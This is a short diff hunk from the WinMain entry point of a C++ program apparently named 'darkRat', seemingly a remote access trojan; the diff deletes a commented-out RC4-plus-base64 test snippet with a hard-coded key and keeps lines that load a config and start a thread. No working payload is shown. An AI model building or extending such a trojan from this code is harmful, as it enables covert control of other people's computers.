@@ -46,20 +46,6 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 		LPSTR szCmdLine,        // Command line arguments.  similar to argv in standard C programs
 		int iCmdShow){
 #endif
-	/*
-	absent::crypto::RC4 rc4;
-
-	std::string write = "FuckYea";
-	std::cout << write << std::endl;
-	write = rc4.crypt(write, "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>");
-	write = absent::crypto::b64::encode(write.c_str());
-
-	char* c_write = &write[0u];
-	std::cout << write << std::endl;
-	while (true) {
-	
-	}
-	*/
 		darkRat::config::config config = darkRat::config::load();
 		//Config config;
 		std::thread darkMain;
